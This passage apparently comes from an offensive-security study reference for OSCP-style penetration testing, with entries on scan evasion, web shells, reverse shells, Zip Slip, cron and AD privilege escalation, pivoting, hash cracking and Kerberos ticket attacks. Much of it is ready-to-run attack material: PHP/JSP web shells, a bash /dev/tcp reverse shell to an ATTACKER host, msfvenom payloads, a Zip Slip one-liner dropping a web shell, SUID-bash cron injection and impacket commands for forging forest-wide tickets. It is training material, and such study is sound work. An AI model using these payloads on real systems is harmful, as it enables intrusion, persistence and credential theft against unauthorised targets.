    -D RND:10          # decoy scan (hide your IP among decoys)
    -S <spoofed-ip>    # spoof source (needs -e iface; replies won't return)
    --source-port 53   # some firewalls trust 53/udp, 80, 443 as source
    --data-length 25   # pad packets to dodge signatures
    --spoof-mac 0      # random MAC (same L2)

## Timing / rate (avoid tripping thresholds)
    -T2 / -T1          # slower = quieter (IDS rate limits)
    --scan-delay 1s ; --max-rate 50

## Confirm what filtering is doing
    nmap --reason       # why a port is open/filtered/closed
    nmap -sA            # ACK scan: maps firewall ruleset (filtered vs unfiltered)

## Gotchas
- `-Pn` is the fix for 'host seems down' behind an ICMP-dropping firewall.
- Decoys/spoofing don't help you GET replies (except decoys, which just add noise) — mainly attribution.
- Through proxychains you must use -sT (connect) and often -Pn. See **livehost-discovery**, atlas **nmap**.

entries.title: OS & service fingerprinting
entries.brief: Work out the target OS from nmap, TTL, and service banners before you pick exploits
entries.body:
## Nmap does most of it
    nmap -O TARGET                 # OS detection (needs a few open+closed ports)
    nmap -sV TARGET                # service/version -> maps to OS + CVEs
    nmap -O --osscan-guess TARGET  # aggressive guess when uncertain

## Quick TTL heuristic (from a ping/any reply)
    TTL ~64   -> Linux/Unix
    TTL ~128  -> Windows
    TTL ~255  -> network device (Cisco/router) / some Unix
    # TTL decreases by 1 per hop, so 61 ~= Linux 3 hops away

## Banner & behaviour tells
    - SMB: nmap smb-os-discovery / rdp-ntlm-info leak the exact Windows build + domain
    - HTTP Server header, default error pages, path case-sensitivity (Win vs Linux)
    - SSH banner (OpenSSH vs Windows OpenSSH), service ports (445/3389 = Windows)

## Why it matters
OS drives everything: payload format (ELF vs PE), privesc path (sudo/SUID vs tokens/services),
shell type, and which exploits apply. Fingerprint BEFORE you choose tools.

## Gotchas
- TTL can be altered; treat it as a hint, confirm with -O/-sV and open ports.
- A box can be dual-stack/containerised — the service may run a different OS than the host.
- See **enumeration-mindset**; atlas **nmap**.

entries.title: Web shells & catching the shell
entries.brief: Pick the right web shell for the stack, then upgrade it to an interactive reverse shell
entries.body:
## Match the shell to the server
    PHP:   <?php system($_GET['c']); ?>            # also assert/eval variants
    JSP:   <% Runtime.getRuntime().exec(request.getParameter("c")); %>   (Tomcat/Java)
    ASPX:  <% ... Process.Start ... %>             (IIS/.NET)
    # Kali ships many: /usr/share/webshells/ (php/jsp/aspx/perl)

## Get it onto the target
    # upload bypass (see file-upload-bypass), LFI/log poisoning, writable share/FTP, SQLi INTO OUTFILE
    # minimal first: confirm exec with ?c=id, THEN go interactive

## Upgrade to a reverse shell
    # from the web shell, run a one-liner callback to your listener:
    ?c=bash -c 'bash -i >%26 /dev/tcp/ATTACKER/443 0>%261'     # URL-encode (& -> %26)
    # Windows: powershell reverse one-liner (see reverse-shell-cheatsheet)
    # catch it:  rlwrap nc -lvnp 443   (then stabilise: shell-stabilization)

## Meterpreter/msfvenom web payloads
    msfvenom -p php/reverse_php LHOST=.. LPORT=.. -o sh.php   # or java/jsp/aspx + handler

## Gotchas
- URL-encode shell metacharacters in GET params (& | ; space) or the command breaks.
- AV/WAF flags common webshells -> minimal/obfuscated one-liners survive better.
- Always upgrade off the clunky web shell to a real TTY ASAP. See **reverse-shell-cheatsheet**, **shell-stabilization**.

entries.title: Mobile app testing methodology (Android focus)
entries.brief: The static + dynamic + network workflow for pulling an APK apart
entries.body:
## 1. Get the app
    adb shell pm list packages ; adb shell pm path com.target ; adb pull <path> app.apk
    # or grab the APK from the store / device

## 2. Static analysis
    apktool d app.apk          # smali + resources (AndroidManifest, strings.xml)
    jadx-gui app.apk           # decompile to Java (read logic/secrets)
    d2j-dex2jar app.apk        # dex->jar for jd-gui (alt)
    mobsf                      # automated report: perms, secrets, insecure APIs
    # hunt: hardcoded keys, endpoints, exported components (see deeplink-abuse)

## 3. Dynamic analysis
    # emulator/rooted device + Frida/Objection:
    objection -g com.target explore      # runtime inspection, bypass helpers
    frida-trace / custom hooks           # hook methods, dump crypto/args
    drozer                               # IPC / content-provider / activity abuse

## 4. Network / API
    # proxy the app through Burp (set device proxy + install Burp CA as a system cert)
    # SSL pinning in the way? see ssl-pinning-bypass
    # then test the API as usual (see api-testing-methodology)

## Gotchas
- AndroidManifest exported=true components are the classic attack surface (drozer).
- Secrets in the APK are not secret — always grep decompiled source/resources.
- The real vulns are usually in the BACKEND API the app talks to. See atlas **jadx**/**apktool**/**frida**/**objection**/**mobsf**.

entries.title: SSL/TLS pinning bypass (mobile)
entries.brief: Get a mobile app's HTTPS traffic into Burp when it pins its certificate
entries.body:
## The problem
Proxying a mobile app needs the app to trust your Burp CA. Many apps PIN the server cert/key and
reject your interception CA, so traffic won't show in Burp until you defeat pinning.

## First get the CA trusted
    # install Burp CA as a SYSTEM cert (Android 7+ ignores user certs for app traffic)
    # Magisk module 'Move Certificates' or remount /system on a rooted device/emulator

## Bypass pinning (dynamic)
    objection -g com.target explore -c 'android sslpinning disable'   # one-liner
    frida -U -f com.target -l pinning-bypass.js                       # e.g. universal frida script
    # 'frida-multiple-unpinning' / objection cover most common pinning libs

## Bypass pinning (static patch)
    # decompile with apktool, remove/patch the pinning check or network_security_config,
    # add a user-trust anchor, rebuild + resign (apksigner), reinstall

## Gotchas
- Android 7+ : a USER CA isn't trusted by apps -> you need a SYSTEM cert (root) or a patched app.
- Custom/native pinning can defeat generic Frida scripts -> hook the specific check or static-patch.
- Once bypassed, test the API normally. See **mobile-app-testing**, atlas **frida**/**objection**.

entries.title: Software supply-chain attack basics
entries.brief: Dependency confusion, typosquatting and poisoned builds — concepts and checks
entries.body:
## The idea
Instead of attacking the app directly, attack what it TRUSTS: its dependencies, build pipeline and
artifacts. One poisoned package or build step runs everywhere the software is installed.

## Dependency confusion
    # an internal package name (e.g. 'acme-utils') not claimed on the PUBLIC registry
    # -> publish a higher version publicly; some resolvers pull the public one = your code runs
    # look for internal names in package.json / requirements / pom that aren't public

## Typosquatting
    # a malicious package named like a popular one (reqeusts, python-dateutil-typo)
    # a dev/CI that installs the typo runs the attacker's install hook

## Poisoned build / pipeline (see ci-cd-attacks)
    # commit to a repo with CI -> your build step/test hook runs with pipeline secrets
    # compromised dependency version pinned in a lockfile

## Defensive/assessment checks
    # scope internal vs public package names; verify registry config (scoped registries)
    # SCA tools: npm audit / pip-audit / dependency-check / snyk (atlas) for known-bad deps

## Gotchas
- This is mostly a real-world/red-team topic, less OSCP-exam — know the concept for CI/CD boxes.
- Only test packages/registries you are AUTHORISED for; publishing to public registries is out of scope.
- See **ci-cd-attacks**, **git-repo-forensics**.

entries.title: CRLF injection & HTTP response splitting
entries.brief: Inject %0d%0a into headers to set cookies, redirect, poison caches or inject a body
entries.body:
## The idea
If user input reaches an HTTP response header unsanitised, injecting CR/LF (`%0d%0a`) lets you add
your own headers or even a response body - header injection, open redirect, cache poisoning, XSS.

## Where to test
    # anything reflected into a header: redirects (Location), Set-Cookie, custom headers, log lines
    ?url=%0d%0aSet-Cookie:%20sessid=attacker
    ?next=/%0d%0aLocation:%20https://evil.com

## Impact payloads
    # inject a header:
    val=x%0d%0aX-Injected:%20true
    # response splitting -> inject a full second response / body with XSS:
    val=x%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a...<script>alert(1)</script>
    # log injection: CRLF into a value that gets logged -> forge log lines / poison an LFI'd log

## Encodings to try when %0d%0a is filtered
    %0d%0a  %0D%0A  \r\n  %E5%98%8A%E5%98%8D (unicode CR/LF overlong)  just %0a (LF only)

## Gotchas
- Modern frameworks strip CR/LF from header APIs; test older apps, proxies and manual header building.
- CRLF into Location is a quick open-redirect + header-inject two-for-one.
- Fuzz it with crlfuzz (atlas). Chains into web-cache-poisoning and XSS.

entries.title: Archive extraction attacks (Zip Slip & friends)
entries.brief: Malicious archive entries use ../ or symlinks to write files outside the extraction dir
entries.body:
## The idea
When an app extracts an uploaded zip/tar without sanitising entry names, an entry like
`../../../../var/www/html/shell.php` writes OUTSIDE the target dir - arbitrary file write, often RCE.

## Zip Slip (path traversal in entry names)
    # craft a zip whose entry name contains ../ sequences:
    python3 -c "import zipfile;z=zipfile.ZipFile('evil.zip','w');z.writestr('../../../../var/www/html/sh.php','<?php system($_GET[c]);?>');z.close()"
    # upload + let the app extract -> sh.php lands in the webroot

## Symlink attacks (tar)
    # a tar entry that is a symlink to / or to a sensitive path, then a second entry writing 'through' it
    ln -s /etc/cron.d link ; tar cf evil.tar link ; (add a payload entry named link/job)

## Where it hits
    # avatar/zip uploads, import/restore features, plugin/theme installers, firmware updaters
    # also client-side: an extractor on YOUR box extracting an untrusted archive

## Gotchas
- The win is choosing a destination the app can write AND that executes (webroot, cron.d, authorized_keys).
- Many libs now block ../ in entries; symlink and absolute-path variants sometimes still slip through.
- Treat downloaded archives as untrusted - extract in an isolated dir (see your own opsec).

entries.title: Writable cron script / PATH privesc
entries.brief: A root cron that runs a file (or bare command) you can write = root on the next tick
entries.body:
## Find root cron jobs
    cat /etc/crontab /etc/cron.d/* ; ls -la /etc/cron.{hourly,daily,weekly}
    crontab -l ; ls -la /var/spool/cron/crontabs/   # per-user
    pspy64        # catch jobs you can't read (atlas: pspy)

## Case 1 - the script itself is writable
    ls -la /path/to/job.sh        # writable by you or your group?
    echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /path/to/job.sh
    # wait for the cron tick, then: /tmp/rb -p

## Case 2 - the job calls a bare command (PATH hijack)
    # crontab has a writable-dir PATH and the job runs e.g. 'backup' without a full path:
    echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /writable/backup
    chmod +x /writable/backup     # runs as the cron owner (root) on next tick

## Case 3 - writable included dir
    # a job that runs everything in a dir you can write (run-parts /some/dir) -> drop a script there

## Gotchas
- Check the crontab PATH line; a writable dir earlier in it enables the bare-command hijack.
- Wildcards in a cron command are a separate bug (see cron-wildcard).
- Timing: note the schedule; some jobs run only hourly/daily. See enumeration-checklist-linux.

entries.title: Child-to-parent domain escalation (intra-forest) - reference
entries.brief: Owning a child domain usually means owning the forest root via the trust/SID history
entries.body:
## Why it works
Within a single forest, the parent/child trust is two-way and transitive, and SID filtering is NOT
applied. A child Domain Admin can craft a ticket whose PAC claims membership in the forest root's
Enterprise Admins - so child DA ~= forest root. This is post-child-compromise escalation.

## Prereqs (you already own the child domain)
    # child krbtgt hash (via DCSync in the child), child domain SID,
    # the forest root domain SID, and the Enterprise Admins RID (519)
    impacket-secretsdump -just-dc-user 'CHILD/krbtgt' child-da:pass@child-dc

## The technique (tooling)
    # forge an inter-realm TGT with an extra SID = <root-SID>-519 (sidHistory / 'extra SIDs'):
    impacket-ticketer -nthash <child-krbtgt> -domain CHILD.corp.local \
      -domain-sid <child-SID> -extra-sid <rootSID>-519 Administrator
    export KRB5CCNAME=Administrator.ccache
    impacket-secretsdump -k -no-pass root-dc.corp.local -just-dc   # now act on the root DC
    # Rubeus/mimikatz have equivalent golden-ticket-with-SIDs flows

## Gotchas
- Intra-forest only - cross-FOREST trusts enforce SID filtering and block the extra-SID trick.
- It needs full child-domain compromise first (child krbtgt). Reference-level; see golden-ticket, dcsync.
- The forest, not the domain, is the real AD security boundary (defender note).

entries.title: Null / anonymous session enumeration
entries.brief: Unauthenticated SMB/RPC/LDAP access that still leaks users, shares and policy
entries.body:
## What a null session is
An anonymous (no username/password) connection to SMB/RPC/LDAP. Misconfigured hosts still answer -
handing you users, groups, shares and the password policy with no creds at all.

## SMB / RPC
    smbclient -L //TARGET/ -N                      # list shares anonymously
    rpcclient -U '' -N TARGET                       # then: enumdomusers, querydominfo, lsaquery
    nxc smb TARGET -u '' -p '' --shares --users --pass-pol
    enum4linux-ng -A TARGET                         # wraps it all

## LDAP (anonymous bind)
    ldapsearch -x -H ldap://TARGET -s base          # does anonymous bind work?
    ldapsearch -x -H ldap://TARGET -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName
    windapsearch -d corp.local --dc-ip TARGET -U    # users via anon LDAP

## RID cycling (when enumdomusers is blocked but lsa isn't)
    nxc smb TARGET -u '' -p '' --rid-brute          # or ridenum (atlas)

## Gotchas
- 'Guest' with a blank password sometimes works where true null is blocked - try both.
- Even a few leaked usernames/policy enable AS-REP roast + safe spraying (see those).
- Modern Windows restricts anonymous access; legacy/misconfigured hosts are the win. See smb-enumeration.

entries.title: Pivoting & tunneling — which tool when
entries.brief: Port forward vs SOCKS vs tun, and the command for each shape, including ligolo's tunnel and listener menus
entries.body:
## The one question
Which side can reach which, and do you need one port or the whole subnet?
A port forward moves one port. A SOCKS proxy is any TCP port the pivot can open, and each tool is wrapped.
A full tunnel is a tun interface plus a route, so you dial the internal IP directly.

## Four shapes
Local forward. You listen. The pivot connects onward to an internal host. You then use your own localhost.
Remote forward. The pivot listens. Connections there come back to a port on your machine. A deep host uses this when it cannot route to you.
SOCKS. One local port stands for every host and port the pivot can open. proxychains wraps each tool. TCP connect only.
Full tunnel. A tun device and a route. Ping can work. Tools are not wrapped. ligolo-ng and sshuttle are this shape.

## Ligolo's two menus
In the proxy, help splits the work the way the prompt groups it.
Tunneling is the subnet: autoroute, tunnel_start (start), tunnel_list (session_list), tunnel_stop (stop).
Listeners are one port: listener_add, listener_list, listener_stop.
listener_add --addr is the address on the agent. --to is the address on your machine. --tcp or --udp.
--help prints that usage. -h and -help are rejected.

## The same shape, each tool
| Shape | Command | Then |
| --- | --- | --- |
| Local, SSH | ssh -L 9000:10.10.20.5:445 user@PIVOT -N | connect to 127.0.0.1:9000 |
| Local, chisel | ./chisel client YOU:8080 9000:10.10.20.5:445 | server already: chisel server -p 8080 --reverse |
| Local, socat | socat tcp-listen:9000,fork tcp:10.10.20.5:445 | run this on the pivot |
| Local, netsh | netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9000 connectaddress=10.10.20.5 connectport=445 | connect to the Windows host IP, after a firewall allow |
| Local, meterpreter | portfwd add -l 9000 -p 445 -r 10.10.20.5 | connect to 127.0.0.1:9000 |
| Remote, SSH | ssh -R 9001:127.0.0.1:9001 user@PIVOT -N | your listener is already on 9001 |
| Remote, chisel | ./chisel client YOU:8080 R:9001:127.0.0.1:9001 | server was started with --reverse |
| Remote, ligolo | listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001 --tcp | nc -lvnp 9001 on you first |
| Remote, plink | plink.exe -R 9001:127.0.0.1:9001 user@YOU -N | from Windows, back to your SSH server |
| SOCKS, SSH | ssh -D 1080 user@PIVOT -N | proxychains, socks5 127.0.0.1 1080 |
| SOCKS, chisel | ./chisel client YOU:8080 R:socks | same proxychains line |
| SOCKS, on the pivot | microsocks -p 1080 | reach that port through an existing path |
| Tun, ligolo | tunnel_start --tun ligolo | after route_add, or use autoroute |
| Tun, SSH creds | sshuttle -r user@PIVOT 10.10.20.0/24 | needs SSH and Python on the pivot |
| HTTP only | neo-regeorg | SOCKS carried over HTTP from a webshell |
| DNS only | dnscat2 | when DNS is the only egress |

## What a scan may do
Through SOCKS or proxychains, nmap -sT -Pn. No ping, no UDP, no SYN scan.
Through ligolo, ping works and listener_add --udp exists. nmap -sS does not. Use nmap -sT -Pn --unprivileged.
sshuttle routes the subnet over SSH. It is not a raw-socket path for every probe.

## Pick
| You have | Reach for | Open |
| --- | --- | --- |
| SSH, one port | ssh -L or ssh -R | oscp atlas ssh |
| SSH, many ports | ssh -D plus proxychains, or sshuttle | oscp atlas proxychains |
| A shell, no SSH | ligolo-ng | oscp atlas ligolo-ng |
| A shell, and HTTP egress | chisel | oscp atlas chisel |
| Windows, no upload, one port | netsh portproxy | oscp atlas netsh |
| One relay and nothing else | socat | oscp atlas socat |
| A second subnet | ligolo listener_add of port 11601, then a second agent | oscp atlas ligolo-ng |

## Order
On the pivot, see what it can see: ip a, ip route, arp -a, ss -tlnp.
Pick the row in the table. Bring that one tunnel up. Scan the new subnet as its own network.
A deeper subnet uses the same shape again, through the tunnel you already have.

## Pages
oscp technique show port-forwarding
oscp technique show ssh-tunneling-patterns
oscp technique show port-forwarding-cheatsheet
oscp technique show windows-pivoting-netsh
oscp technique show proxychains-pivoting
oscp technique show pivoting-playbook
oscp technique show proxychains-macos

entries.title: Password cracking & brute - which tool when
entries.brief: The one-place guide: offline hash cracking vs online brute/spray, hashcat vs john, wordlist choice
entries.body:
## The first split: what do you actually have?
- A HASH (string, or from a dumped DB/SAM/NTDS) -> OFFLINE cracking (hashcat/john). Fast, silent, no lockout.
- An encrypted FILE (zip/pdf/kdbx/ssh key/office) -> extract a hash with a *2john tool, then crack offline.
- A live LOGIN SERVICE (ssh/ftp/http/rdp/smb/AD) -> ONLINE brute/spray (hydra/nxc/kerbrute). Slow, noisy, lockout risk.
Offline beats online every time it's possible - get the hash, don't hammer the login.

## Decision matrix
| You have | Reach for | Atlas |
|---|---|---|
| A hash, unknown type | identify first: name-that-hash / haiti | oscp atlas name-that-hash |
| A hash, want raw speed | hashcat -m <mode> (GPU) | oscp atlas hashcat |
| A hash in a format hashcat lacks | john --format=... (more formats) | oscp atlas john |
| Encrypted zip/pdf/kdbx/ssh key | zip2john/keepass2john/ssh2john -> john/hashcat | oscp atlas keepass2john |
| A zip/pdf quickly | fcrackzip / pdfcrack (direct) | oscp atlas fcrackzip |
| Steghide image | stegseek (fast brute) | oscp atlas stegseek |
| A live service login | hydra / medusa / ncrack / patator | oscp atlas hydra |
| RDP or SSH-key brute | crowbar / ncrack | oscp atlas crowbar |
| AD users + one password | kerbrute passwordspray / nxc / sprayhound | oscp atlas sprayhound |
| Kerberoast / AS-REP output | hashcat -m 13100 / -m 18200 | oscp atlas hashcat |
| WPA handshake | hashcat -m 22000 | oscp atlas hashcat |
| Need a wordlist | rockyou/SecLists; targeted: cewl/cupp/pydictor | oscp atlas cewl |

## Crack vs DON'T crack
Often you don't need the plaintext at all:
- NTLM hash -> pass-the-hash (see pass-the-hash) instead of cracking.
- Kerberos ticket/hash -> pass-the-ticket / overpass-the-hash.
- Crack ONLY when you need the cleartext (reuse on other services, RDP/console login, or a weak-password finding).

## Offline workflow (the loop)
    1. Identify:  nth '<hash>'            (name-that-hash / haiti -> suggests the mode)
    2. Mode:      hashcat --example-hashes | grep -i <type>   (or see hash-mode-reference)
    3. Wordlist:  hashcat -m N hashes rockyou.txt            (dictionary first)
    4. Rules:     ... rockyou.txt -r best64.rule             (then OneRuleToRuleThemAll)
    5. Masks:     hashcat -m N hashes -a 3 '?u?l?l?l?d?d?d?d!' (brute the holdouts; see cracking-rules-and-masks)
    6. Manage:    --status ; --restore ; --show ; -O (optimized) ; -w 3 (workload)

## hashcat vs john (tie-breaker)
- hashcat: GPU, fastest, the most modes, best rule/mask engine -> default for raw hashes.
- john: CPU-friendly, more exotic formats, the whole *2john extractor ecosystem (zip2john/keepass2john/ssh2john/pdf),
  and 'single' mode using the username/GECOS -> use when hashcat lacks the format or you have no GPU.

## Online brute - last resort
- Prefer found creds + reuse (see credential-reuse-strategy), spraying (password-spraying-ad) and roasting over brute.
- If you must brute: small targeted list, mind the LOCKOUT policy (polenum/--pass-pol), and expect noise.

## Gotchas
- Match the EXACT mode: NTLM(1000) vs NetNTLMv2(5600) vs NTLMv1 vs sha512crypt(1800) are all different.
- Slow hashes (bcrypt 3200, sha512crypt 1800, KeePass 13400) -> targeted wordlist + rules, never raw brute.
- File is 'user:hash'? use --username (hashcat) / john handles it; otherwise strip the username.
- Deep dives: **hash-cracking-workflow**, **cracking-rules-and-masks**, **hash-mode-reference**, **wordlist-generation**.

entries.title: Privilege escalation - what you found maps to which technique
entries.brief: The one-place guide: run an enumerator, then route each finding to the right privesc + entry
entries.body:
## The method (both platforms)
1. Enumerate with a tool, 2. READ the output, 3. map each finding below to its technique, 4. verify by hand.
Work TOP-DOWN: a config misconfig (sudo/SUID/service/cron/token) is safer and more reliable than a kernel
exploit - try kernel/CVE exploits last.

## Enumerate first (which tool)
    Linux:   linpeas (broad) | lse (focused, less noise) | pspy (watch cron/root procs) | suid3num (SUID) | linux-exploit-suggester (kernel)
    Windows: winPEAS (broad) | PowerUp / PrivescCheck (privesc-focused) | Seatbelt (host survey) | accesschk (ACLs) | wesng/watson (missing patches)
    Then verify every lead manually - tools cry wolf and miss context.

## Linux - finding -> technique
| What the enum shows | Technique | Entry |
|---|---|---|
| sudo -l lets you run something | sudo/GTFOBins abuse | oscp manual show sudo-gtfobins-privesc |
| sudo version is old | sudo CVE (Baron Samedit) | oscp manual show sudo-cve-baron |
| SUID binary (find -perm -4000) | SUID/GTFOBins | oscp manual show suid-concept |
| file capability (getcap) | cap_setuid etc. | oscp manual show capabilities-cap-setuid |
| writable root cron / script | cron script/PATH | oscp manual show writable-cron-script |
| cron runs `tar *` / wildcard | wildcard injection | oscp manual show cron-wildcard |
| writable service / systemd unit | systemd/service abuse | oscp manual show linux-systemd-privesc |
| in docker / lxd / disk group | group-to-root | oscp manual show docker-group-privesc |
| writable dir on $PATH (bare cmd) | PATH hijack | oscp manual show path-hijack |
| sudo keeps LD_PRELOAD / writable ld.so.preload | LD_PRELOAD | oscp manual show ld-preload-privesc |
| writable /etc/passwd or /etc/shadow | passwd/shadow rewrite | oscp manual show writable-passwd-shadow-privesc |
| NFS export with no_root_squash | NFS root | oscp manual show nfs-no-root-squash |
| only the kernel looks old | kernel exploit (pwnkit/dirtypipe) | oscp manual show kernel-exploits |

## Windows - finding -> technique
| What the enum shows | Technique | Entry |
|---|---|---|
| whoami /priv has SeImpersonate | Potato family | oscp manual show windows-potato-attacks |
| whoami /priv has SeBackup/SeRestore | backup-operator read | oscp manual show backup-operators-privesc |
| other SeXxx privileges | token abuse map | oscp manual show token-impersonation-privs |
| modifiable service (binpath/ACL) | service binary/config | oscp manual show writable-service-binary |
| unquoted service path | unquoted path | oscp manual show unquoted-service-path |
| writable scheduled task | task hijack | oscp manual show scheduled-task-privesc |
| AlwaysInstallElevated = 1 | MSI as SYSTEM | oscp manual show alwaysinstallelevated |
| writable dir on a service's DLL path | DLL hijack | oscp manual show windows-dll-hijacking |
| creds in files/registry | credential hunting | oscp manual show windows-credential-hunting |
| need hashes from memory | LSASS dump | oscp manual show lsass-dump |
| missing KB / old build | patch/kernel exploit | oscp manual show kernel-exploits |

## Tool picker (enumerators)
- Linux: linpeas = everything (noisy); lse = tighter signal; pspy = catch root cron/procs you can't read; suid3num = flags exploitable SUIDs; linux-exploit-suggester = kernel candidates.
- Windows: winPEAS = everything; PowerUp/PrivescCheck = privesc-focused + abuse helpers; Seatbelt = host survey; accesschk = check a specific ACL; wesng/watson = missing-patch exploits.
- GTFOBins/LOLBAS are the lookup for a given binary's abuse (see gtfobins-logic).

## Golden rules
- Enumerate -> READ -> map -> verify. The lead is almost always in the enum output you skimmed.
- Config misconfig before kernel: sudo/SUID/service/cron/token beat a crash-prone kernel exploit.
- After ANY new access, re-enumerate (sudo -l as the new user, new groups, new files).
- Grab a root/SYSTEM proof screenshot immediately (see report-writing-guide).

## See also
    full checklists:  enumeration-checklist-linux  /  enumeration-checklist-windows
    the why/stage map: oscp methods show full-workflow ; oscp howto escalate

entries.title: Getting a shell - foothold by service & tech
entries.brief: The one-place guide: turn web or service access into code exec, then catch & stabilise the shell
entries.body:
## The three steps (every foothold)
1. GET CODE EXEC on the target (route depends on the service/tech - tables below).
2. CATCH the callback (a listener on your box) - or use the access directly.
3. STABILISE it (real TTY) and move off any clunky web shell fast.
If outbound is filtered, use a BIND shell / poll a web shell, or route the callback out (ngrok/chisel).

## A) Web / app access -> code exec
| Tech / vuln | Route to a shell | Entry |
|---|---|---|
| PHP app, you can write a file | drop a web shell, then upgrade | oscp manual show web-shells-and-handlers |
| File upload accepted | bypass filters -> web shell | oscp manual show file-upload-bypass |
| LFI (php://, log/session) | wrappers / log poisoning / filter-chain | oscp manual show file-inclusion-wrappers |
| WordPress (admin) | theme/plugin editor or malicious plugin | oscp manual show wordpress-to-rce |
| Command injection | inject a reverse-shell one-liner | oscp manual show command-injection-bypass |
| SQL injection (privileged DB) | INTO OUTFILE / xp_cmdshell / COPY PROGRAM | oscp manual show sqli-to-rce |
| SSTI | template engine -> RCE | oscp manual show ssti-to-rce |
| Tomcat manager access | deploy a malicious WAR | oscp manual show tomcat-exploitation |
| Jenkins (script console) | Groovy exec | oscp manual show jenkins-exploitation |
| WebDAV / PUT enabled | upload .asp/.jsp/.php | oscp manual show webdav-exploitation |

## B) Non-web services -> a session
| Service (port) | Route to a shell | Entry / atlas tool |
|---|---|---|
| SSH (22) + creds/key | ssh / reuse a found key | oscp manual show ssh-enumeration |
| SMB (445) + local admin | psexec / wmiexec / smbexec (or hash) | oscp manual show pass-the-hash |
| WinRM (5985/5986) | evil-winrm (pw or -H hash) | oscp manual show winrm-enumeration |
| RDP (3389) | xfreerdp (pw or /pth) | oscp manual show rdp-enumeration |
| FTP (21) writable -> webroot | upload a web shell, browse it | oscp manual show ftp-enumeration |
| MSSQL (1433) sysadmin | enable + xp_cmdshell | oscp manual show mssql-enumeration |
| MySQL (3306) privileged | UDF exec / INTO OUTFILE web shell | oscp manual show mysql-udf-privesc |
| Redis (6379) unauth | write web shell / SSH key / cron | oscp manual show redis-enumeration |
| Samba (Linux SMB) | version CVE / writable share | oscp manual show samba-exploitation |
| NFS (2049) no_root_squash | write a SUID/cron via the share | oscp manual show nfs-no-root-squash |
| Telnet (23) + creds | log in directly | oscp manual show telnet-enumeration |

## Generate the payload
    oscp hacktools revshell          # per-tech one-liners (bash/python/php/powershell/nc), fills LHOST/LPORT
    # or the reference cheatsheet with every variant:
    oscp manual show reverse-shell-cheatsheet
    # staged/exe payloads:
    msfvenom -p <os>/<arch>/shell_reverse_tcp LHOST=.. LPORT=.. -f <fmt>   (atlas: msfvenom)

## Catch the callback (listener on your box)
    rlwrap nc -lvnp 443              # readline-friendly; -lvnp (atlas: nc / rlwrap)
    ncat --ssl -lvnp 443            # TLS listener (atlas: ncat)
    pwncat-cs -lp 443               # auto-stabilises + upload/download (atlas: pwncat-cs)

## Stabilise & operate
    Linux dumb shell -> full TTY:   oscp manual show shell-stabilization
    Windows interactive:            Invoke-ConPtyShell (atlas: conptyshell) or evil-winrm
    Move tools on/off target:       oscp manual show file-transfer-cheatsheet / windows-file-transfer

## Decision rules
- Egress filtered (no outbound)? use a BIND shell, poll a web shell, or tunnel the callback out (ngrok/chisel - see pivoting-tool-selection).
- Windows: prefer evil-winrm / psexec / a real payload over raw nc; ConPtyShell for an interactive TTY.
- Always URL-encode web reverse-shell one-liners (& | ; space); confirm exec with `id`/`whoami` first.
- Upgrade off a web shell to a proper reverse shell + TTY immediately - then enumerate for privesc.

## See also (360)
    oscp howto foothold        # the phase view
    oscp methods show full-workflow
    next step after a shell:   oscp manual show privesc-tool-selection

entries.title: Kerberos — where each attack sits on the exchange
entries.brief: AS-REQ through AP-REQ, and which attack touches which message
entries.body:
## The normal exchange
A client proves who it is once, then carries tickets. The password is not sent to each service.
The Authentication Service (AS) checks the first login and returns a ticket-granting ticket (TGT).
The Ticket-Granting Service (TGS) accepts that TGT and returns a ticket for one service.
The client presents that service ticket to the service. The service ticket is not the TGT.

    attacker        victim            KDC (AS / TGS)       service
       |              |                    |                  |
       |-- AS-REQ ----+------------------->|                  |
       |<- AS-REP/TGT-+--------------------|                  |
       |-- TGS-REQ ---+------------------->|                  |
       |<- TGS-REP ---+--------------------|                  |
       |-- AP-REQ ----+--------------------+----------------->|
       |<- AP-REP ----+--------------------+------------------|

AS-REQ is the login request. AS-REP carries the TGT, wrapped so the client unwraps it with a key from the password.
TGS-REQ asks for one service. TGS-REP carries that service ticket.
AP-REQ presents the service ticket. AP-REP is the service's optional reply.

## Where each attack sits
Read the row for the message you are on, or for the secret you already hold. Open the write-up. The tool column is the atlas name, not a recipe.

| You see or you hold | Attack | Secret | Reaches | Open |
| --- | --- | --- | --- | --- |
| AS-REQ, pre-auth off | AS-REP roast | a user list | one account's password, offline | asreproasting |
| TGS-REP for an SPN | Kerberoast | any domain login | that service account | kerberoasting-deep |
| AP-REQ, ticket already in hand | pass-the-ticket | the ticket file | whatever that ticket allows | pass-the-hash-ticket |
| krbtgt hash | golden ticket | krbtgt NT hash | the domain | golden-ticket |
| a service or computer hash | silver ticket | that account's NT hash | that one service | golden-silver-tickets |
| krbtgt hash plus a real TGT | diamond ticket | krbtgt, and a TGT the KDC issued | the domain | kerberos-flow |
| krbtgt hash, PAC built by the KDC | sapphire ticket | krbtgt, PAC comes from the KDC | the domain | kerberos-flow |
| a service may front for a user | S4U2self, then S4U2proxy | the delegation right | the next service | constrained-delegation |
| NT hash from SAM or LSASS | pass-the-hash | the NT hash | NTLM, not this exchange | pass-the-hash |
| SeImpersonatePrivilege | potato to SYSTEM | that privilege on this box | this box, not the domain | windows-potato-attacks |

S4U2self is the service asking for a ticket to itself as the user. S4U2proxy forwards that ticket to the next service, for example a web host forwarding to MySQL.
The what-you-hold table, with the usual tool for each row, is `oscp technique show kerberos-attacks-map`.

## Four ticket names
Golden, silver, diamond, and sapphire differ by which secret is required and what the ticket is allowed to reach.

## Golden
A new TGT built from the krbtgt hash. Services across the domain can be asked with it. The KDC did not issue that TGT.

## Silver
A new service ticket built from that service account's hash. It is presented straight to the service. The domain controller is not asked.

## Diamond
Starts from a TGT the KDC really issued. The krbtgt hash is what lets the ticket be changed to name a different user. The skeleton of the ticket came from the domain controller.

## Sapphire
The domain controller builds the PAC, using S4U, for the user being impersonated. The authorization data inside the ticket is the KDC's own.

Ticket file shapes (kirbi and ccache) are `oscp technique show kerberos-ticket-formats`.

## Not this exchange
## Pass-the-hash
An NT hash from the local SAM database or from LSASS is NTLM material. It does not travel as AS-REQ or TGS-REQ. A service hash is also the secret a silver ticket needs, which is the point where this side box meets the exchange.

## SeImpersonatePrivilege
